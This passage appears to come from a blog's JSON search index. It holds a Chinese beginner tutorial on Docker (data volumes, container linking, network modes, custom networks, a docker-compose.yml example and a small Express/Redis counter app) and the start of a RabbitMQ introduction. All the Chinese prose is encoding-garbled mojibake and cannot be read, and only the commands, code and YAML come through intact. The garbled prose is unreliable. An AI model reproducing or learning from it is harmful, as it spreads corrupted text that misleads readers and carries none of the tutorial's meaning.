å®¹å™¨å†…éƒ¨çš„ç›®å½•ä¸‹ã€‚ä¹Ÿå°±æ˜¯è¯´å®é™…çš„ç›®å½•æ–‡ä»¶æ˜¯å­˜æ”¾åœ¨æœ¬åœ°ç£ç›˜ä¸Šçš„ï¼Œdocker å®¹å™¨é€šè¿‡æŒ‚è½½çš„æ–¹å¼å¯ä»¥ç›´æ¥ä½¿ç”¨æœ¬åœ°ç£ç›˜ä¸Šçš„æ–‡ä»¶ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼š 1ã€Data Volume æ•°æ®å·æ˜¯å­˜æ”¾åœ¨æœ¬åœ°ç£ç›˜ä¸Šï¼Œæ‰€ä»¥æ•°æ®æ˜¯æŒä¹…åŒ–çš„ï¼Œå³ä½¿å®¹å™¨è¢«æ€æ­»ä¹Ÿä¸ä¼šå½±å“æ•°æ®å·ä¸­çš„æ•°æ®ã€‚ 2ã€ä¸åŒçš„å®¹å™¨æŒ‚è½½åŒä¸€ä¸ªæ•°æ®å·å°±å®ç°äº†æ•°æ®çš„å…±äº«ã€‚ 3ã€å®¹å™¨å¯¹æ•°æ®å·ä¸­æ“ä½œéƒ½æ˜¯å³æ—¶çš„ï¼Œä¸€ä¸ªå®¹å™¨æ”¹å˜äº†æ•°æ®ï¼Œé‚£ä¹ˆå¦ä¸€ä¸ªå®¹å™¨å°±ä¼šå³æ—¶çœ‹åˆ°è¿™ç§æ”¹å˜ã€‚ æ€»è€Œè¨€ä¹‹ï¼ŒæŒ‚è½½æ•°æ®å·å…¶å®å°±æ˜¯é—´æ¥çš„æ“ä½œæœ¬åœ°ç£ç›˜ä¸Šçš„æ•°æ®ï¼Œæ‰€è°“é—´æ¥æ˜¯å› ä¸ºå®¹å™¨æ“ä½œçš„æ˜¯å…¶å†…éƒ¨æ˜ å°„çš„ç›®å½•ï¼Œè€Œä¸æ˜¯å®¿ä¸»æœºæœ¬åœ°ç›®å½•ã€‚ ","date":"2018-04-17","objectID":"/docker-guide/:4:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"æ•°æ®å·å®¹å™¨ å¦‚æœæœ‰å¤šä¸ªå®¹å™¨éƒ½éœ€è¦æŒ‚è½½æ•°æ®å·ï¼Œéš¾é“éœ€è¦æ¯ä¸€ä¸ªå®¹å™¨éƒ½æŒ‚è½½ä¸€éåˆ°æœ¬åœ°ï¼Ÿå½“ç„¶ä¸æ˜¯ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™é‡Œå¼•å…¥äº†æ•°æ®å·å®¹å™¨ï¼ˆå›¾ä¸­çš„ Data Container ï¼‰ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„å®¹å™¨ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡æ•°æ®å·å®¹å™¨æŒ‚è½½ï¼ˆ -v ï¼‰ä¸€æ¬¡æ•°æ®å·ï¼Œå…¶ä»–éœ€è¦æŒ‚è½½çš„å®¹å™¨ç›´æ¥è¿æ¥ï¼ˆ â€“volumes-from ï¼‰è¿™ä¸ªæ•°æ®å·å®¹å™¨å°±è¡Œäº†ï¼Œè€Œå†ä¸éœ€è¦çŸ¥é“å®é™…çš„å®¿ä¸»æœºæœ¬åœ°ç›®å½•ã€‚ æ•°æ®å·å®¹å™¨æ˜¯å¦å­˜åœ¨å•ç‚¹æ•…éšœï¼Ÿä¹Ÿå°±æ˜¯è¯´æ•°æ®å·å®¹å™¨æŒ‚äº†ï¼Œå…¶å®ƒçš„å®¹å™¨è¿˜èƒ½æŒ‚è½½å¹¶ä½¿ç”¨æ•°æ®å—ï¼Ÿç­”æ¡ˆæ˜¯ä»ç„¶èƒ½æ­£å¸¸ä½¿ç”¨æ•°æ®ï¼Œå› ä¸ºæ•°æ®å·å®¹å™¨æœ¬èº«åªæ˜¯ä¸€ä¸ªæ•°æ®å·æŒ‚è½½çš„é…ç½®ä¼ é€’çš„ä½œç”¨ï¼Œåªè¦å…¶å®ƒå®¹å™¨æŒ‚è½½ä¸Šå°±ä¼šä¸€ç›´æœ‰æ•ˆï¼Œä¸ä¼šå› ä¸ºæ•°æ®å·å®¹å™¨æŒ‚äº†è€Œäº§ç”Ÿå•ç‚¹æ•…éšœã€‚ æœ¬èŠ‚ç®€å•è®²è¿°äº†æ•°æ®å·çš„ç›¸å…³æ¦‚å¿µï¼Œå®é™…æ“ä½œåªéœ€è¦é€šè¿‡ docker run å‘½ä»¤å¯åŠ¨å®¹å™¨æ—¶ä½¿ç”¨ -vï¼ˆæŒ‚è½½åˆ°æœ¬åœ°ç›®å½•ï¼‰å’Œ â€“volumes-fromï¼ˆè¿æ¥åˆ°æ•°æ®å·å®¹å™¨ï¼‰å‚æ•°å³å¯ã€‚ å›› åœºæ™¯ï¼šå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª web åº”ç”¨ï¼Œéœ€è¦æ˜¾ç¤ºæ€»å…±è¿æ¥çš„æ¬¡æ•°ï¼ŒåŒæ—¶æˆ‘ä»¬ä½¿ç”¨å¦ä¸€ä¸ª redis æœåŠ¡å»è®°å½•è¿™ä¸ªæ•°å€¼ï¼Œæ˜¾ç„¶ web æ˜¯éœ€è¦è¿æ¥åˆ° redis ä¸Šçš„ï¼Œè€Œåœ¨ docker å®¹å™¨ä¸­ï¼Œæ¯ä¸ªå®¹å™¨éƒ½é»˜è®¤æœ‰è‡ªå·±ç‹¬ç«‹çš„è™šæ‹Ÿç½‘ç»œï¼Œé‚£ä¹ˆå®¹å™¨ä¹‹é—´åº”è¯¥å¦‚ä½•è¿æ¥ï¼Ÿ ","date":"2018-04-17","objectID":"/docker-guide/:5:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"link é¦–å…ˆæˆ‘ä»¬å¯åŠ¨ä¸€ä¸ª redis å®¹å™¨ï¼Œå¹¶é€šè¿‡ â€“name æŒ‡å®šå®¹å™¨åä¹Ÿå« redis ï¼š docker run --name redis redis ç„¶åï¼Œå¯åŠ¨ web å®¹å™¨ï¼Œé€šè¿‡ â€“link æŒ‡å®šè¿æ¥çš„å®¹å™¨å¹¶æŒ‡å®šè¿™ä¸ªè¿æ¥çš„åç§°ï¼ˆæ³¨æ„ä»¥ä¸‹æŒ‡ä»¤éƒ½æ˜¯åœ¨ docker run åé¢æ·»åŠ çš„éƒ¨åˆ†ï¼‰ï¼š --link redis:redis_connection è€Œæˆ‘ä»¬çš„ web ç¨‹åºä¸­ç›´æ¥ä½¿ç”¨ä¸Šé¢å®šä¹‰çš„è¿æ¥å redis_connetion å³å¯ï¼š const express = require('express'); const Redis = require('ioredis'); const redis = new Redis({ port: 6379, host: 'redis' // --net è‡ªå®šä¹‰ç½‘ç»œï¼Œä½¿ç”¨åˆ«å // host: 'redis_connection' // --link [container]:[alias] // host: 'localhost' // --net=container:[container-name] ä½¿ç”¨æŒ‡å®šå®¹å™¨çš„ç½‘ç»œ }); const app = express(); const PORT = 8888; app.get('/', async (req, res) =\u003e { try { const r = await redis.incr('count'); res.end(` count: ${r} \\r\\n`); } catch (error) { console.log(error); } }); app.listen(PORT); è¿™æ · web å®¹å™¨ä¾¿å¯ä»¥è¿æ¥ä¸Š redis å®¹å™¨äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä½¿ç”¨ link æ–¹æ³•ï¼Œå…¶ä¼šåœ¨å®¹å™¨å¯åŠ¨æ—¶ï¼ˆå®¹å™¨æ¯æ¬¡å¯åŠ¨éƒ½ä¼šé»˜è®¤é…ç½®ä¸åŒçš„è™šæ‹Ÿç½‘ç»œï¼‰æ‰¾åˆ°è¿æ¥çš„ç›®æ ‡å®¹å™¨å¹¶åœ¨æœ¬å®¹å™¨å†…éƒ¨è®¾ç½®ç¯å¢ƒå˜é‡å¹¶ä¿®æ”¹ /etc/hosts æ–‡ä»¶ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨è¿æ¥åˆ«åè€Œä¸ç”¨æŒ‡å®šå…·ä½“ IP åœ°å€çš„åŸå› ã€‚ ä½†æ˜¯ï¼Œä¸å»ºè®®ä½¿ç”¨è¿™ç§æ–¹å¼ï¼ŒåŒæ—¶è¿™ç§æ–¹å¼ä¹Ÿå°†ä¼šåœ¨æœªæ¥è¢«ç§»é™¤ã€‚ ","date":"2018-04-17","objectID":"/docker-guide/:6:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"net 1ã€net æ–¹å¼ä¸€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š æˆ‘ä»¬å…ˆå°† redis å®¹å™¨çš„ç«¯å£æš´éœ²åˆ°æœ¬åœ°å®¿ä¸»æœºï¼Œç„¶ååœ¨ web ä¸­æŒ‡å®šæœ¬åœ°å®¿ä¸»æœºå…·ä½“çš„ IP åœ°å€ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å®ç°è¿æ¥ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ web ä¸­ä¸èƒ½ç›´æ¥ä½¿ç”¨ localhost ï¼Œå› ä¸ºå‰é¢å·²ç»æåˆ°äº†ï¼Œæ¯ä¸ªå®¹å™¨éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„è™šæ‹Ÿç½‘ç»œï¼Œä½¿ç”¨ localhost å°†ä¼šæŒ‡å‘çš„æ˜¯è¿™ä¸ªå®¹å™¨å†…éƒ¨ï¼Œè€Œä¸æ˜¯å®¿ä¸»æœºã€‚ è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œå¾ˆéº»çƒ¦ï¼Œä¸€æ–¹é¢ redis éœ€è¦æš´éœ²ç«¯å£ï¼Œå¦ä¸€æ–¹é¢è¿˜å¿…é¡»çŸ¥é“å®¿ä¸»æœºå…·ä½“çš„ IP åœ°å€ã€‚ 2ã€net æ–¹å¼äºŒï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è¿™é‡Œä¸å‰ä¸€ç§æ–¹å¼ä¸åŒçš„æ˜¯ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡ â€“net host æŒ‡å®šå®¹å™¨ç›´æ¥ä½¿ç”¨å®¿ä¸»æœºç½‘ç»œï¼Œè¿™æ ·åœ¨ web ä¸­å°±å¯ä»¥ç›´æ¥é€šè¿‡ localhost è¿æ¥åˆ° redis äº†ï¼Œä¸ç”¨çŸ¥é“å®¿ä¸»æœºå…·ä½“çš„ IP åœ°å€ï¼Œå¯¹æ¯”ä¸Šä¸€ç§æ–¹å¼çœ‹ä¼¼æœ‰ä¸€ç‚¹å°çš„æ”¹è¿›ã€‚ ä½†æ˜¯è¿™ç§æ–¹å¼çš„é—®é¢˜åœ¨äºï¼Œå¯¹äº MacOS ç³»ç»Ÿæ— æ³•ä½¿ç”¨ï¼Œå› ä¸ºåœ¨ MacOS ä¸Š Docker ä»ç„¶æ˜¯è·‘åœ¨ä¸€å±‚è™šæ‹Ÿæœºä¸­çš„ï¼Œè¿™ç§æ–¹å¼ç›®å‰è¿˜æ— æ³•ç©¿é€è¿™å±‚è™šæ‹Ÿæœºç›´æ¥å°† localhost æ˜ å°„åˆ°å®¿ä¸»æœºæœ¬åœ°ï¼ŒåŒæ—¶ï¼Œç›´æ¥ä½¿ç”¨å®¿ä¸»æœºç½‘ç»œï¼Œå®¹å™¨å…¶å®ä¼šå…¨éƒ¨æš´éœ²å‡ºæ¥ï¼Œå­˜åœ¨å®‰å…¨éšæ‚£ï¼Œå› æ­¤ä¹Ÿä¸å»ºè®®ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚ 3ã€net æ–¹å¼ä¸‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è¿™é‡Œé€šè¿‡ â€“net container çš„æ–¹å¼ç›´æ¥æŒ‡å®š web ä½¿ç”¨ä¸ redis ç›¸åŒçš„ç½‘ç»œï¼Œè¿™æ ·æ—¢é¿å…äº†æ— è°“çš„ç«¯å£æš´éœ²ï¼ŒåŒæ—¶åˆèƒ½ä¿æŒå®¹å™¨ä¸å®¿ä¸»æœºä¹‹é—´çš„éš”ç¦»ï¼Œè¿™ç§æ–¹å¼æ˜¯å»ºè®®ä½¿ç”¨çš„ã€‚ ä½†æ˜¯å­˜åœ¨éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯ â€“net container æŒ‡å®šå®¹å™¨ç½‘ç»œä¸ -p æš´éœ²ç«¯å£ä¸èƒ½åŒæ—¶ä½¿ç”¨ï¼Œæ¢å¥è¯è¯´ï¼Œæœ¬æ¥æˆ‘ä»¬çš„ web å®¹å™¨æ˜¯éœ€è¦ -p æš´éœ²ç«¯å£åˆ°å®¿ä¸»æœºï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½åœ¨æœ¬åœ°è®¿é—®åˆ° web æœåŠ¡ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬å·²ç»ä½¿ç”¨äº† â€“net container æŒ‡å®šå…¶ä½¿ç”¨ä¸ redis ç›¸åŒçš„ç½‘ç»œï¼Œæ‰€ä»¥ä¸èƒ½å†ä½¿ç”¨ -p äº†ï¼Œé‚£æ€ä¹ˆåŠï¼Ÿå¯ä»¥åœ¨å¦ä¸€ä¸ª redis å®¹å™¨ä¸Šä½¿ç”¨ -p ï¼Œå°†æœ¬æ¥åº”è¯¥ç”± web ç›´æ¥æš´éœ²çš„ç«¯å£é—´æ¥çš„ç”± redis æš´éœ²ï¼Œæ¯•ç«Ÿæ­¤æ—¶æˆ‘ä»¬çš„ web å’Œ redis å®¹å™¨éƒ½å·²ç»ä½¿ç”¨äº†åŒä¸€ä¸ªç½‘ç»œï¼Œæ‰€ä»¥è¿™æ ·åšä¹Ÿæ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†è¿˜æ˜¯æœ‰ç‚¹åˆ«æ‰­çš„ã€‚ ","date":"2018-04-17","objectID":"/docker-guide/:7:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"è‡ªå®šä¹‰ç½‘ç»œ å®˜æ–¹åœ¨å®£å‘Š link æ–¹å¼å°†ä¼šè¢«ç§»é™¤çš„åŒæ—¶ï¼Œæ¨èçš„æ›¿ä»£æ–¹å¼å°±æ˜¯è‡ªå®šä¹‰ç½‘ç»œã€‚ åˆ›å»ºä¸€ä¸ªç®€å•çš„è‡ªå®šä¹‰ç½‘ç»œï¼š docker network create -d bridge my-network å°† web å’Œ redis å®¹å™¨è¿æ¥åˆ°åŒä¸€ä¸ªè‡ªå®šä¹‰çš„ç½‘ç»œä¸­ï¼Œå¹¶ç›´æ¥åœ¨ web ä¸­çš„ redis host æŒ‡å‘ redis å®¹å™¨çš„åˆ«åï¼Œå³å¯å®Œæˆè¿æ¥ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å¯¹äºè‡ªå®šä¹‰ç½‘ç»œï¼Œæˆ‘ä»¬ä¸ä»…èƒ½å¤Ÿåœ¨å®¹å™¨å¯åŠ¨æ—¶é€šè¿‡ â€“net ç›´æ¥æŒ‡å®šï¼Œè¿˜èƒ½å¤Ÿåœ¨å®¹å™¨å·²ç»å¯åŠ¨å®Œæˆåé€šè¿‡ï¼š docker network connect [network-name] [container] åç»­æ·»åŠ è¿›å»ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ–¹ä¾¿å¿«é€Ÿçš„å®Œæˆå®¹å™¨ç½‘ç»œçš„åˆ‡æ¢ä¸è¿ç§»ã€‚ é€šè¿‡è‡ªå®šä¹‰ç½‘ç»œï¼Œæˆ‘ä»¬è¿˜èƒ½å¤Ÿå®šä¹‰æ›´åŠ å¤æ‚çš„ç½‘ç»œè§„åˆ™ï¼Œæ¯”å¦‚ç½‘å…³ã€å­ç½‘ã€IP åœ°å€èŒƒå›´ç­‰ç­‰ï¼Œå½“ç„¶æ›´å¤šçš„ç»†èŠ‚è¿˜è¯·æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ã€‚ äº” å‡è®¾æˆ‘ä»¬ç°åœ¨éœ€è¦å¯åŠ¨å¤šä¸ªå®¹å™¨ï¼Œè¿™äº›å®¹å™¨åˆéœ€è¦è¿›è¡Œä¸åŒçš„æ•°æ®æŒ‚è½½ï¼Œå®¹å™¨ä¹‹é—´ä¹Ÿéœ€è¦ç›¸äº’è¿æ¥ï¼Œæ˜¾ç„¶ï¼Œå¦‚æœæŒ‰ç…§ä¼ ç»Ÿçš„æ–¹æ³•é€šè¿‡ docker run æŒ‡ä»¤å¯åŠ¨ä»–ä»¬å°†ä¼šæ˜¯éæ³•éº»çƒ¦çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ° docker-compose è¿›è¡Œå®¹å™¨ç¼–æ’ã€‚ ","date":"2018-04-17","objectID":"/docker-guide/:8:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Kubernetes"],"content":"docker-compose è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼šä¸€ä¸ª web æœåŠ¡ï¼Œä¸€ä¸ª redis æ•°æ®åº“ï¼Œweb æœåŠ¡æŒ‚è½½æœ¬åœ°çš„æ•°æ®æ–¹ä¾¿è°ƒè¯•ï¼ŒåŒæ—¶ä¹Ÿéœ€è¦è¿æ¥ä¸Š redis è¿›è¡Œæ“ä½œã€‚ é¦–å…ˆåœ¨è¿›è¡Œç¼–æ’æ—¶ï¼Œæˆ‘ä»¬å°†ä¸€ä¸ªå¤§çš„é¡¹ç›®ç§°ä¹‹ä¸º project ï¼Œé»˜è®¤åç§°ä¸ºé¡¹ç›®æ–‡ä»¶å¤¹çš„åç§°ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡ COMPOSE_PROJECT_NAME æ”¹å˜ã€‚åœ¨ project ä¹‹ä¸‹ï¼Œä¼šæœ‰å¤šä¸ª service æœåŠ¡ï¼Œè¿™æ˜¯ç¼–æ’çš„åŸºæœ¬å•ä½ï¼Œæ¯”å¦‚ç¤ºä¾‹ä¸­çš„ web å’Œ redis å°±æ˜¯ä¸¤ä¸ªä¸åŒçš„ service ã€‚ docker-compose.ymlï¼š version: '3' # æŒ‡å®š compose çš„ç‰ˆæœ¬ services: web: # å®šä¹‰ service # build: # é‡æ–°æ„å»ºé•œåƒ # context: . # æ„å»ºé•œåƒçš„ä¸Šä¸‹æ–‡(æœ¬åœ°ç›¸å¯¹è·¯å¾„) # dockerfile: Dockerfile # æŒ‡å®š dockerfile æ–‡ä»¶ # args: # æ„å»ºé•œåƒæ—¶ä½¿ç”¨çš„ç¯å¢ƒå˜é‡ # - NODE_ENV=develop container_name: web-container # å®¹å™¨åç§° image: docker-demo # ä½¿ç”¨å·²å­˜åœ¨çš„é•œåƒ ports: # ç«¯å£æ˜ å°„ - \"9999:8888\" networks: # ç½‘ç»œ - my-network depends_on: # service ä¹‹é—´çš„ä¾èµ– - redis volumes: # æŒ‚è½½æ•°æ® - \"./:/work/myapp/\" restart: always # é‡å¯è®¾ç½® env_file: # ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶, key=value - ./docker.env environment: # è®¾ç½®ç¯å¢ƒå˜é‡, ä¼šè¦†ç›– env ä¸­ç›¸åŒçš„ç¯å¢ƒå˜é‡ NODE_ENV: abc command: npm run test # å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„æŒ‡ä»¤ redis: container_name: redis-container image: redis:latest networks: - my-network networks: # è‡ªå®šä¹‰ç½‘ç»œ my-network: å¦‚ä¸Šæ‰€ç¤ºï¼Œé¦–å…ˆéœ€è¦æŒ‡å®š compose çš„ç‰ˆæœ¬ï¼Œä¸åŒç‰ˆæœ¬ä¹‹é—´å­˜åœ¨ä¸€å®šçš„å·®å¼‚ï¼Œå…·ä½“çš„éœ€è¦æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ã€‚ ç„¶åï¼Œåœ¨ services è¿™ä¸ª top-level ä¸‹é¢æŒ‡æ˜å„ä¸ªå…·ä½“çš„ service æ¯”å¦‚ web å’Œ redis ï¼Œåœ¨å…·ä½“çš„ service ä¸‹é¢å†è¿›è¡Œè¯¦ç»†çš„é…ç½®ï¼š buildï¼šé€šè¿‡ dockerfile é‡æ–°æ„å»ºé•œåƒ container_nameï¼šæŒ‡å®šå®¹å™¨çš„åç§° imageï¼šç›´æ¥ä½¿ç”¨å·²å­˜åœ¨çš„é•œåƒ portsï¼šè®¾ç½®ç«¯å£æ˜ å°„ networksï¼šè®¾ç½®å®¹å™¨æ‰€åœ¨çš„ç½‘ç»œ depends_onï¼šè®¾ç½®ä¾èµ–å…³ç³» volumesï¼šè®¾ç½®æ•°æ®æŒ‚è½½ restartï¼šè®¾ç½®é‡å¯ env_fileï¼šè®¾ç½®ç¯å¢ƒå˜é‡çš„é›†ä¸­é…ç½®æ–‡ä»¶ environmentï¼šåŒæ ·æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡ commandï¼šå®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„æŒ‡ä»¤ åœ¨å…·ä½“ service ä¸‹æŒ‡å®šçš„ networks å¿…é¡»å¯¹åº”å­˜åœ¨äº top-level çš„ networks ä¸­ï¼Œåç§°å¯ä»¥éšæ„å–ï¼Œæ‰€æœ‰å…·æœ‰ç›¸åŒ networks çš„ service ä¹Ÿå°±å¯ä»¥è¿›è¡Œç›¸äº’è¿æ¥ï¼Œè¿™æ ·å°±æ˜¯ä¸€ä¸ªå®šä¹‰ç½‘ç»œã€‚ é€šè¿‡ depends_on è®¾ç½®çš„ä¾èµ–å…³ç³»ä¼šå†³å®šå®¹å™¨å¯åŠ¨çš„å…ˆåé¡ºåºï¼Œåœ¨ç¤ºä¾‹ä¸­ï¼Œç”±äºæˆ‘ä»¬æŒ‡å®šäº† web æ˜¯ä¾èµ–äº redis çš„ï¼Œæ‰€ä»¥ä¼šå¯åŠ¨ redis ä¹‹åå†å¯åŠ¨ web ï¼Œä½†æ˜¯è¿™é‡Œçš„åˆ¤æ–­æ ‡å‡†æ˜¯å®¹å™¨è¿è¡Œäº†å°±ç»§ç»­å¯åŠ¨ä¸‹ä¸€ä¸ªï¼Œå¦‚æœä½ æƒ³æ›´å¥½çš„æ§åˆ¶å¯åŠ¨é¡ºåºï¼Œå¯ä»¥ä½¿ç”¨ wait-for-it æˆ–è€… dockerize ç­‰å®˜æ–¹æ¨èçš„ç¬¬ä¸‰æ–¹å¼€æºå·¥å…·ã€‚ è‡³äº volumes ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¼ ç»ŸæŒ‚è½½è®¾ç½®ï¼ˆç¤ºä¾‹ä¸­å°±æ˜¯çš„ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è‡ªå‘½åçš„æ–¹æ³•ï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨äº†è‡ªå‘½åï¼Œå…¶ä¸ networks ç±»ä¼¼ï¼Œå¿…é¡»å¯¹åº”å­˜åœ¨äº top-level çš„ volumes ä¹‹ä¸­ã€‚ å¯¹äºç¯å¢ƒå˜é‡ï¼Œæ—¢å¯ä»¥é€šè¿‡ environment å•ç‹¬è®¾ç½®ï¼Œä¹Ÿå¯ä»¥å°†æ‰€æœ‰çš„ç¯å¢ƒå˜é‡é›†ä¸­é…ç½®åˆ° env æ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡ env_file å¼•ç”¨ã€‚ ä»¥ä¸Šå°±æ˜¯ä¸€äº›ç®€å•ä¸”å¸¸ç”¨çš„é…ç½®ã€‚é…ç½®å®Œæˆä¹‹åï¼Œé€šè¿‡ï¼š docker-compose up å°±å¯ä»¥ä¸€æ¬¡å¯åŠ¨æ‰€æœ‰å®¹å™¨äº†ï¼Œå¯åŠ¨å®ŒæˆååŒæ ·å¯ä»¥é€šè¿‡ compose çš„å…¶ä»–æŒ‡ä»¤è¯¸å¦‚ï¼špauseã€unpauseã€startã€stopã€restartã€killã€down ç­‰ç­‰è¿›è¡Œå…¶ä»–æ“ä½œã€‚ å†™åˆ°è¿™é‡Œï¼Œå…¶å®æˆ‘ä»¬å·²ç»å®Œæˆäº†ä»æ„å»ºé•œåƒåˆ°å®¹å™¨ç¼–æ’æ•´ä¸ªæµç¨‹ï¼Œè¿™é‡Œå…ˆå‘Šä¸€æ®µè½ã€‚ä½†æ˜¯ç›®å‰æˆ‘ä»¬æ‰€åŸºäºçš„å´ä¸€ç›´æ˜¯å•ä¸»æœºç¯å¢ƒï¼Œè€Œå¯¹äºå¤šä¸»æœºç­‰æ›´å¤æ‚çš„ç¯å¢ƒä¸‹å¦‚ä½•å¿«é€Ÿæ–¹ä¾¿çš„æ»¡è¶³ç”Ÿäº§ä¸Šçš„å„ç§éœ€æ±‚ï¼Œæˆ‘ä»¬å°±ä¸å¾—ä¸æåˆ° swarm å’Œ kubernetesï¼ˆç®€ç§° k8s ï¼‰ï¼Œä»ç›®å‰æ¥çœ‹ï¼Œk8s å·²ç„¶æˆä¸ºäº†ä¸»æµï¼Œåç»­æœ‰æœºä¼šå°†ä¼šå›´ç»• k8s å†™ä¸€å†™ç³»åˆ—æ–‡ç« ã€‚ ","date":"2018-04-17","objectID":"/docker-guide/:9:0","tags":["Docker","Kubernetes"],"title":"Docker å…¥é—¨æ•™ç¨‹","uri":"/docker-guide/"},{"categories":["Middleware"],"content":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","date":"2018-02-27","objectID":"/rabbitmq/","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"ä¸€ æ¶ˆæ¯ä¸­é—´ä»¶ MQï¼ˆä¹Ÿç§°æ¶ˆæ¯é˜Ÿåˆ—ï¼‰çš„åŸºæœ¬åŠŸèƒ½æ˜¯ä¼ é€’å’Œè½¬å‘æ¶ˆæ¯ï¼Œå…¶æœ€é‡è¦çš„ä½œç”¨æ˜¯èƒ½å¤Ÿè§£è€¦ä¸šåŠ¡åŠç³»ç»Ÿæ¶æ„ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ä¸ªç³»ç»Ÿå‘å±•å£®å¤§åˆ°ä¸€å®šé˜¶æ®µç»•ä¸å¼€çš„ä¸œè¥¿ã€‚ è€Œ RabbitMQ æ˜¯å¯¹ AMQPï¼ˆé«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ï¼‰çš„å®ç°ï¼Œæˆç†Ÿå¯é å¹¶ä¸”å¼€æºï¼Œæœ¬ç³»åˆ—æ–‡ç« å°†ä¼šè®²è¿°å¦‚ä½•åœ¨ node ä¸­å…¥é—¨è¿™ä¸€åˆ©å™¨ã€‚ ","date":"2018-02-27","objectID":"/rabbitmq/:1:0","tags":["MQ","Node.js","RabbitMQ"],"title":"RabbitMQ å…¥é—¨æ•™ç¨‹åŠç¤ºä¾‹","uri":"/rabbitmq/"},{"categories":["Middleware"],"content":"RabbitMQ æ¦‚è¿° å…ˆæ¥ç®€å•çš„äº†è§£ä¸€ä¸‹ RabbitMQ ç›¸å…³çš„åŸºæœ¬æ¦‚å¿µï¼š Producer ï¼šç”Ÿäº§è€…ï¼Œç”Ÿæˆæ¶ˆæ¯å¹¶æŠŠæ¶ˆæ¯å‘é€ç»™ RabbitMQ ã€‚ Consumer ï¼šæ¶ˆè´¹è€…ï¼Œä» RabbitMQ ä¸­æ¥æ”¶æ¶ˆæ¯ã€‚ Exchange ï¼šäº¤æ¢å™¨ï¼Œå…·æœ‰è·¯ç”±çš„ä½œç”¨ï¼Œå°†ç”Ÿäº§è€…ä¼ é€’çš„æ¶ˆæ¯æ ¹æ®ä¸åŒçš„è·¯ç”±è§„åˆ™ä¼ é€’åˆ°å¯¹åº”çš„é˜Ÿåˆ—ä¸­ã€‚äº¤æ¢å™¨å…·æœ‰å››ç§ä¸åŒçš„ç±»å‹ï¼Œæ¯ç§ç±»å‹å¯¹åº”ä¸åŒçš„è·¯ç”±è§„åˆ™ã€‚ Queue ï¼šé˜Ÿåˆ—ï¼Œå®é™…å­˜å‚¨æ¶ˆæ¯çš„åœ°æ–¹ï¼Œæ¶ˆè´¹è€…é€šè¿‡è®¢é˜…é˜Ÿåˆ—æ¥è·å–é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ã€‚ Binding ï¼šç»‘å®šäº¤æ¢å™¨å’Œé˜Ÿåˆ—ï¼Œåªæœ‰ç»‘å®šåæ¶ˆæ¯æ‰èƒ½è¢«äº¤æ¢å™¨åˆ†å‘åˆ°å…·ä½“çš„é˜Ÿåˆ—ä¸­ï¼Œç”¨ä¸€ä¸ªå­—ç¬¦ä¸²æ¥ä»£è¡¨ Binding Key ã€‚ æ¶ˆæ¯æ˜¯å¦‚ä½•ç”±ç”Ÿäº§è€…ä¼ é€’åˆ°æ¶ˆè´¹è€…ï¼š ç”Ÿäº§è€… Producer ç”Ÿæˆæ¶ˆæ¯ msg ï¼Œå¹¶æŒ‡å®šè¿™æ¡æ¶ˆæ¯çš„è·¯ç”±é”® 